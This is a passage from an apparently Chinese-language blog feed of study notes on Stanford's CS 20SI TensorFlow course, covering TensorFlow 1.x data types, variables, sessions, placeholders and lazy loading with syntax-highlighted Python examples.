t_1 <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">"apple"</span><span class="token punctuation">,</span> b<span class="token string">"peach"</span><span class="token punctuation">,</span> b<span class="token string">"grape"</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># treated as a 1-d tensor, or "vector" </span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> ['' '' '']</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> TypeError: Expected string, got 1 of type 'int' instead.</span>

t_2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># treated as a 2-d tensor, or "matrix"</span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> 2x2 tensor, all elements are False</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> 2x2 tensor, all elements are True</span>
</code></pre>
<h4 id="TensorFlow__u539F_u751F_u7C7B_u578B"><a href="#TensorFlow__u539F_u751F_u7C7B_u578B" class="headerlink" title="TensorFlow 原生类型"></a>TensorFlow 原生类型</h4><p>TensorFlow 有自己的数据类型，比如tf.int32, tf.float32。更多详情<a href="https://www.tensorflow.org/versions/r0.11/resources/dims_types#data_types" target="_blank" rel="external">Data types</a></p>
<h4 id="NumPy__u6570_u636E_u7C7B_u578B"><a href="#NumPy__u6570_u636E_u7C7B_u578B" class="headerlink" title="NumPy 数据类型"></a>NumPy 数据类型</h4><p>TensorFlow 被设计成与 Numpy 兼容，所以 TensorFlow 的数据类型是基于 NumPy 的，甚至 np.int32 == tf.int32 返回 True。所以可以</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1.0</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1.0</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<p>长话短说，TensorFlow 类型和 NumPy 类型可以互相转换，但 TensorFlow 优点更多。</p>
<h3 id="u53D8_u91CF"><a href="#u53D8_u91CF" class="headerlink" title="变量"></a>变量</h3><p>变量被赋值以后还是可以改变，与值储存在 图 中的常量不同，变量是分开的，可能存在参数服务器上。</p>
<p>关于 图 的定义和 图 所包含的内容可以靠打印 图 的 protobuf(Protocol Buffers，是Google公司开发的一种数据描述语言)。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf

my_const <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"my_const"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> tf<span class="token punctuation">.</span>get_default_graph<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>as_graph_def<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>输出就 protobuf。</p>
<h4 id="u58F0_u660E_u53D8_u91CF"><a href="#u58F0_u660E_u53D8_u91CF" class="headerlink" title="声明变量"></a>声明变量</h4><p>声明变量需要通过实例化 tf.Variable。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create variable a with scalar value</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"scalar"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># create variable b as a vector</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"vector"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># create variable c as a 2x2 matrix</span>
c <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"matrix"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># create variable W as 784 x 10 tensor, filled with zeros</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">784</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>tf.Variable 支持以下几个操作:</p>
<pre class=" language-python"><code class="language-python">x <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
x<span class="token punctuation">.</span>initializer <span class="token comment" spellcheck="true"># init </span>
x<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read op </span>
x<span class="token punctuation">.</span>assign<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write op </span>
x<span class="token punctuation">.</span>assign_add<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># and more</span>
</code></pre>
<p><strong>在使用变量之前必须初始化</strong>。使用 tf.global_variables_initializer() 可以非常简单的初始化所有变量。</p>
<pre class=" language-python"><code class="language-python">init <span class="token operator">=</span> tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>init<span class="token punctuation">)</span>
</code></pre>
<p>也可以使用 tf.Variable.initializer 初始化每个变量。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create variable W as 784 x 10 tensor, filled with zeros</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">784</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    tf<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
</code></pre>
<h4 id="u6C42_u53D8_u91CF_u7684_u503C"><a href="#u6C42_u53D8_u91CF_u7684_u503C" class="headerlink" title="求变量的值"></a>求变量的值</h4><p>如果仅打印初始化的变量，得到的是 tensor 对象。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># W is a random 700 x 100 variable object</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>truncated_normal<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
    <span class="token keyword">print</span> W
</code></pre>
<p>为了得到变量的值，需要用求值函数eval()。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># W is a random 700 x 100 variable object</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>truncated_normal<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
    <span class="token keyword">print</span> W<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="u8D4B_u503C"><a href="#u8D4B_u503C" class="headerlink" title="赋值"></a>赋值</h4><p>使用 tf.Variable.assign() 来给变量分配值。</p>
<pre class=" language-python"><code class="language-python">W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
W<span class="token punctuation">.</span>assign<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
    <span class="token keyword">print</span> W<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>然而上面代码的结果还是10，为什么呢？</p>
<p>因为上面的 assign 只是一个操作，并没有去执行。需要在 session 里运行这个操作才能让其有作用。</p>
<pre class=" language-python"><code class="language-python">W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
assign_op <span class="token operator">=</span> W<span class="token punctuation">.</span>assign<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>assign_op<span class="token punctuation">)</span>
    <span class="token keyword">print</span> W<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>这里没进行初始化，是因为 assgin 替我们完成了初始化的操作。其实初始化操作也是一种赋值操作。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a variable whose original value is 2</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"scalar"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># assign a * 2 to a and call that op a_times_two</span>
a_times_two <span class="token operator">=</span> a<span class="token punctuation">.</span>assign<span class="token punctuation">(</span>a <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
init <span class="token operator">=</span> tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>init<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># have to initialize a, because a_times_two op depends on the value of a</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>a_times_two<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># >> 4</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>a_times_two<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># >> 8</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>a_times_two<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># >> 16</span>
</code></pre>
<p>TensorFlow 每次 a_times_two 都会将 a 乘 2。</p>
<p>对于简单的加减，TensorFlow 提供了 tf.Variable.assign_add() 和 tf.Variable.assign_sub() 方法。要注意的是，这两个方法不会初始化变量。</p>
<pre class=" language-python"><code class="language-python">W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>assign_add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>assign_sub<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>TensorFlow 的每个 session 维护各自的值。</p>
<p>当然 变量 可以基于其他 变量 。 比如声明 U = W * 2。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># W is a random 700 x 100 tensor</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>truncated_normal<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
U <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>W <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<p>当然这里最好确保W要先初始化。</p>
<pre class=" language-python"><code class="language-python">U <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initial_value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="InteractiveSession_28_u4EA4_u4E92_u5F0F_u4F1A_u8BDD_29"><a href="#InteractiveSession_28_u4EA4_u4E92_u5F0F_u4F1A_u8BDD_29" class="headerlink" title="InteractiveSession(交互式会话)"></a>InteractiveSession(交互式会话)</h4><p>InteractiveSession 与 Session 不同的地方在于前者会将其本身作为默认的会话，所以之后调用 run() 或 eval() 可以不用指明会话。虽然很方便，但如果有多个会话就很麻烦。</p>
<pre class=" language-python"><code class="language-python">sess <span class="token operator">=</span> tf<span class="token punctuation">.</span>InteractiveSession<span class="token punctuation">(</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">5.0</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">6.0</span><span class="token punctuation">)</span>
c <span class="token operator">=</span> a <span class="token operator">*</span> b
<span class="token comment" spellcheck="true"># We can just use 'c.eval()' without passing 'sess'</span>
<span class="token keyword">print</span> c<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
sess<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>tf.get_default_session() 返回当前线程的默认会话。</p>
<h4 id="Control_Dependencies"><a href="#Control_Dependencies" class="headerlink" title="Control Dependencies"></a>Control Dependencies</h4><p>如果有两个独立操作，想指明哪个操作先执行，可以使用 tf.Graph.control_dependencies(control_inputs)</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># your graph g have 5 ops: a, b, c, d, e </span>
<span class="token keyword">with</span> g<span class="token punctuation">.</span>control_dependencies<span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># `d` and `e` will only run after `a`, `b`, and `c` have executed. </span>
    d <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    e <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<h4 id="Placeholders_28_u5360_u4F4D_u7B26_29__u548C_feed_dict"><a href="#Placeholders_28_u5360_u4F4D_u7B26_29__u548C_feed_dict" class="headerlink" title="Placeholders(占位符) 和 feed_dict"></a>Placeholders(占位符) 和 feed_dict</h4><p>TensorFlow 程序通常有两个时期：</p>
<ol>
<li>构造一个 图</li>
<li>在 图 里使用 会话 执行 操作</li>
</ol>
<p>所以在构造 图 的时候，可以不需要知道计算的具体值，类似于定义一个函数。比如 f(x, y) = x*2 + y，x,y 就是 Placeholders(占位符) 。</p>
<p>定义占位符</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>dtype<span class="token punctuation">,</span> shape<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>
</code></pre>
<p>Dtype 是必须的参数指明了占位符的数据类型。</p>
<p>Shape 规定了占位符能接受的张量的维度。shape=None 表示任何维度都可以接受。坏处就是不好debug。</p>
<p>只定义了占位符还没用，需要通过获取值来进行计算。placeholder 获取的值通过一个字典。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a placeholder of type float 32-bit, shape is a vector of 3 elements</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> shape<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># create a constant of type float 32-bit, shape is a vector of 3 elements</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>float32<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># use the placeholder as you would a constant or a variable</span>
c <span class="token operator">=</span> a <span class="token operator">+</span> b  <span class="token comment" spellcheck="true"># Short for tf.add(a, b)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
      <span class="token comment" spellcheck="true"># feed [1, 2, 3] to placeholder a via the dict {a: [1, 2, 3]}</span>
      <span class="token comment" spellcheck="true"># fetch value of c</span>
      <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># the tensor a is the key, not the string ‘a’</span>
</code></pre>
<p>获取值不仅仅是占位符可以，任何可获取值的张量都可以。使用一下方法可以确定张量是否可获取值:</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>Graph<span class="token punctuation">.</span>is_feedable<span class="token punctuation">(</span>tensor<span class="token punctuation">)</span>
</code></pre>
<p>比如</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create Operations, Tensors, etc (using the default graph)</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>mul<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># start up a `Session` using the default graph</span>
sess <span class="token operator">=</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># define a dictionary that says to replace the value of `a` with 15</span>
replace_dict <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">}</span>
<span class="token comment" spellcheck="true"># Run the session, passing in `replace_dict` as the value to `feed_dict`</span>
sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>b<span class="token punctuation">,</span> feed_dict<span class="token operator">=</span>replace_dict<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># returns 45</span>
</code></pre>
<h4 id="u61D2_u52A0_u8F7D"><a href="#u61D2_u52A0_u8F7D" class="headerlink" title="懒加载"></a>懒加载</h4><p>懒加载是一种编程模式，表示直到加载的时候才声明或者初始化。在 TensorFlow 中，表示直到进行计算的时候才创建这个操作。</p>
<p>比如正常情况下，</p>
<pre class=" language-python"><code class="language-python">x <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>
y <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>
z <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    writer <span class="token operator">=</span> tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span>FileWriter<span class="token punctuation">(</span><span class="token string">'./my_graph/l2'</span><span class="token punctuation">,</span> sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>
    <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>z<span class="token punctuation">)</span>
        writer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>而懒加载的代码</p>
<pre class=" language-python"><code class="language-python">x <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>
y <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
     sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     writer <span class="token operator">=</span> tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span>FileWriter<span class="token punctuation">(</span><span class="token string">'./my_graph/l2'</span><span class="token punctuation">,</span> sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>
     <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
           sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># someone decides to be clever to save one line of code</span>
     writer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>通过查看 TensorBoard ，可以发现不同之处。</p>
<p>当然，也可以通过查看 图 定义，使用</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">print</span> tf<span class="token punctuation">.</span>get_default_graph<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>as_graph_def<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>发现后者，也就是懒加载中，节点 里多了9个 Add 操作的拷贝。明明同样的操作，却会造成很大的开销。为了避免这个情况，尽量分开定义操作和执行。另一种就是使用 Python property装饰器。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               </p>
]]></content>
    
    <summary type="html">
    
      CS 20SI: Tensorflow的Deep Learning研究笔记(二)
    
    </summary>
    
    
      <category term="deep-learning" scheme="http://xinqiu.me/tags/deep-learning/"/>
    
  </entry>
  
  <entry>
    <title>Tensorflow for Deep Learning 1</title>
    <link href="http://xinqiu.me/2017/01/20/cs20si-1/"/>
    <id>http://xinqiu.me/2017/01/20/cs20si-1/</id>
    <published>2017-01-19T16:00:00.000Z</published>
    <updated>2017-02-02T09:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="u7B14_u8BB01_3A__u4ECB_u7ECDTensorFlow"><a href="#u7B14_u8BB01_3A__u4ECB_u7ECDTensorFlow" class="headerlink" title="笔记1: 介绍TensorFlow"></a>笔记1: 介绍TensorFlow</h2><p>“CS 20SI: TensorFlow for Deep Learning Research” (<a href="http://cs20si.stanford.edu" target="_blank" rel="external">http://cs20si.stanford.edu</a>) 这门课是由Chip Huyen(huyenn@stanford.edu)老师上的，我就简单的做做笔记整理&gt; &lt;.</p>
<p>Tensorflow是什么，它很火，哪些公司在用它，它是如何安装的，我这里就不啰嗦了，这些内容网上一大把。</p>
<h3 id="u4E00-_u5F00_u59CB_u5199Tensorflow_u4EE3_u7801"><a href="#u4E00-_u5F00_u59CB_u5199Tensorflow_u4EE3_u7801" class="headerlink" title="一.开始写Tensorflow代码"></a>一.开始写Tensorflow代码</h3><p>这部分内容是可以跳过的，讲的是简单的一个tf程序。(我添加了导入一些包，不然运行不了)</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># iris.py</span>
<span class="token comment" spellcheck="true"># </span>
<span class="token comment" spellcheck="true"># Load dataset.</span>
<span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> cross_validation
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> metrics

iris <span class="token operator">=</span> tf<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>learn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>load_dataset<span class="token punctuation">(</span><span class="token string">'iris'</span><span class="token punctuation">)</span>

